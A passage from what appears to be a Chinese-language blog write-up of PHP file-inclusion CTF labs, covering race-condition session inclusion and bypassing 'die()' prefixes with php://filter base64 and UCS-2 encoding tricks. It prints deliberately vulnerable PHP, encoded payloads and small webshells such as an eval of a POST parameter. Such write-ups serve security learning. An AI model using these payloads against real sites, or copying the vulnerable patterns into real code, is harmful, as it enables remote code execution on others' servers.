class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"rm -rf /tmp/*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时他多了一个删除/tmp/路径下的文件，且无法找回的语句，但是我们仍然可以利用多线程来进行，这是因为多进程同时进行多个的缘故，我们一边   <code>system(&quot;rm -rf /tmp/*&quot;);</code>， 一边<code>include($file);</code>，两者之间是有间隔的,就会出现一边刚删除完一个session文件，另一个线程创建了一个文件，此时就被包含进去，从而成功执行了我们的恶意语句</p>\n<h3 id=\"0X04-1\"><a href=\"#0X04-1\" class=\"headerlink\" title=\"0X04\"></a>0X04</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n \n<span class=\"token function\">define</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'还要秀？'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">dirname</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">set_include_path</span><span class=\"token punctuation\">(</span>还要秀？<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n \n    \n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>先了解一下函数</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">dirname</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 函数返回路径中的目录部分。比如<span class=\"token operator\">/</span>tmp<span class=\"token operator\">/</span>sess_quan9i就返回<span class=\"token operator\">/</span>tmp<span class=\"token operator\">/</span>\n<span class=\"token function\">define</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 函数定义一个常量。\n常量类似变量，不同之处在于：\n    在设定以后，常量的值无法更改\n    常量名不需要开头的美元符号 <span class=\"token punctuation\">(</span>$<span class=\"token punctuation\">)</span>\n    作用域不影响对常量的访问\n    常量值只能是字符串或数字\n <span class=\"token function\">define</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span>value<span class=\"token punctuation\">,</span>case_insensitive<span class=\"token punctuation\">)</span>\n参数 \t\t\t\t描述\nname \t\t\t\t必需。规定常量的名称。\nvalue \t\t\t\t必需。规定常量的值。\ncase_insensitive \t可选。规定常量的名称是否对大小写敏感。\nset_include_path简单理解的话就是给<span class=\"token keyword\">include</span>定义了一个路径<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>限制了include()的路径，但是并不影响上一题的payload，继续使用上一题的方法。</p>\n<p>原因如下：<br>平时include()文件的时候，PHP先会在当前目录下找找有没有这个路径，如果没有，然后就会在include paths里面找</p>\n<p>所谓的include paths不是一个目录，而是很多个目录，这些目录可以通过get_include_path();得到。</p>\n<p>参考文章<br><a href=\"https://www.jianshu.com/p/9fff4501f56b\">https://www.jianshu.com/p/9fff4501f56b</a></p>\n<h2 id=\"文件包含-绕死亡die\"><a href=\"#文件包含-绕死亡die\" class=\"headerlink\" title=\"文件包含(绕死亡die())\"></a>文件包含(绕死亡die())</h2><p>附上p神文章<a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'content'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"&lt;?php die('大佬别秀了');?>\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    \n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>本关我们先了解一下函数</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword type-declaration\">int</span> <span class=\"token function\">file_put_contents</span> <span class=\"token punctuation\">(</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$filename</span> <span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">mixed</span> <span class=\"token variable\">$data</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">int</span> <span class=\"token variable\">$flags</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> <span class=\"token class-name type-declaration\">resource</span> <span class=\"token variable\">$context</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span>\n\n\n参数 \t描述\nfile \t必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。\ndata \t必需。规定要写入文件的数据。可以是字符串、数组或数据流。\nmode \t可选。规定如何打开<span class=\"token operator\">/</span>写入文件。可能的值：\n\n    <span class=\"token constant\">FILE_USE_INCLUDE_PATH</span>\n    <span class=\"token constant\">FILE_APPEND</span>\n    <span class=\"token constant\">LOCK_EX</span>\n\ncontext \t可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以看出是对文件名进行了url编码，因此我们的file需要进行二次url编码，因为服务器还会自动解码一次，此时我们可以利用伪协议base64解码，来绕过死亡die，因为base64解码，只解码常规的0-9和A-Z已经/，所以识别的就是phpdie，我们在构造content时前面加上aa即可成功绕过（base64每四位一节）<br>,构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30\n解码两次后为php://filter/convert.base64-decode/resource=1.php\ncontent=aaPD9waHAgc3lzdGVtKCdscycpOz8+\nbase64解码后为aa<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'ls'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553579.png\" alt=\"在这里插入图片描述\"></p>\n<p>可能有部分师傅不知道去哪里进行url全编码，网上的工具大多数都未全编码，这里我使用的是bp。bp的decoder模块可以进行全编码<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553023.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"有趣的文件包含\"><a href=\"#有趣的文件包含\" class=\"headerlink\" title=\"有趣的文件包含\"></a>有趣的文件包含</h2><h3 id=\"0X01-3\"><a href=\"#0X01-3\" class=\"headerlink\" title=\"0X01\"></a>0X01</h3><p>本关的话打开是个电影，我们抓包然后进行猜测，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">GET</span> <span class=\"token operator\">/</span>index<span class=\"token operator\">.</span>php<span class=\"token operator\">?</span>file<span class=\"token operator\">=</span><span class=\"token keyword\">var</span><span class=\"token operator\">/</span>www<span class=\"token operator\">/</span>html<span class=\"token operator\">/</span>index<span class=\"token operator\">.</span>php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>然后可以发现过滤规则</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/http|https|data|input|rot13|base64|string|log|sess/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'too young too simple sometimes naive!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"5.mp4\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Content-Type: video/mp4'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Content-Length: <span class=\"token interpolation\"><span class=\"token variable\">$file</span></span>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">readfile</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时我们修改变量，让他包含flag文件，那不就直接读取了吗，因为<code>readfile($file);</code>，所以构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">GET</span> <span class=\"token operator\">/</span>index<span class=\"token operator\">.</span>php<span class=\"token operator\">?</span>file<span class=\"token operator\">=</span><span class=\"token keyword\">var</span><span class=\"token operator\">/</span>www<span class=\"token operator\">/</span>html<span class=\"token operator\">/</span>flag<span class=\"token operator\">.</span>php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h3 id=\"0X02-3\"><a href=\"#0X02-3\" class=\"headerlink\" title=\"0X02\"></a>0X02</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'too young too simple sometimes naive!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$contents</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'contents'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"&lt;?php die();?>\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$contents</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这关的话过滤了data64和rot13，但是还有很多，例如<code>convert.iconv.UCS-2LE.UCS-2BE</code>编码，这个编码就是将一部分内容进行交换位置，因此我们构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span>\ncontents<span class=\"token operator\">=</span><span class=\"token operator\">?</span><span class=\"token operator\">&lt;</span>hp <span class=\"token class-name type-declaration\">pvela</span>$<span class=\"token punctuation\">(</span><span class=\"token constant\">P_SO</span><span class=\"token punctuation\">[</span><span class=\"token constant\">T</span><span class=\"token punctuation\">]</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token operator\">?</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>此时访问a.php，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'ls'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553984.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553048.png\" alt=\"在这里插入图片描述\"></p>\n","feature":true,"text":"前言近期发现文件包含这方面几乎一窍不通，特来对此漏洞进行学习，并总结如下，希望能对正在学习文件包含的人有些许帮助。 漏洞相关信息漏洞成因后端编程人员一般会把重复使用的函数写到单个文件中，需要使用时再直接调用此文件即可，该过程也就 被称为文件包含。文件包含的存在使得开发变得更加灵活...","link":"","photos":[],"count_time":{"symbolsCount":"16k","symbolsTime":"15 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"文件包含","slug":"文件包含","count":1,"path":"api/tags/文件包含.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">漏洞相关信息</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0\"><span class=\"toc-text\">漏洞成因</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3\"><span class=\"toc-text\">漏洞危害</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB\"><span class=\"toc-text\">漏洞分类</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">漏洞常用函数</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">利用方法</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">实战</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%97%A0%E9%99%90%E5%88%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">无限制本地包含实战</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9C%89%E5%90%8E%E7%BC%80%E7%9A%84%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">有后缀的本地包含实战</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AE%9E%E6%88%98-%E7%AE%80%E5%8D%95\"><span class=\"toc-text\">文件包含实战(简单)</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X01\"><span class=\"toc-text\">0X01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X02\"><span class=\"toc-text\">0X02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X03\"><span class=\"toc-text\">0X03</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X04\"><span class=\"toc-text\">0X04</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%E7%B1%BB%EF%BC%89\"><span class=\"toc-text\">文件包含（日志包含类）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X01-1\"><span class=\"toc-text\">0X01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X02-1\"><span class=\"toc-text\">0X02</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AE%9E%E6%88%98%EF%BC%88%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%EF%BC%89\"><span class=\"toc-text\">文件包含实战（条件竞争）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X01-2\"><span class=\"toc-text\">0X01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X02-2\"><span class=\"toc-text\">0X02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X03-1\"><span class=\"toc-text\">0X03</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X04-1\"><span class=\"toc-text\">0X04</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E7%BB%95%E6%AD%BB%E4%BA%A1die\"><span class=\"toc-text\">文件包含(绕死亡die())</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9C%89%E8%B6%A3%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\"><span class=\"toc-text\">有趣的文件包含</span></a><ol class=\"toc-child\"><li 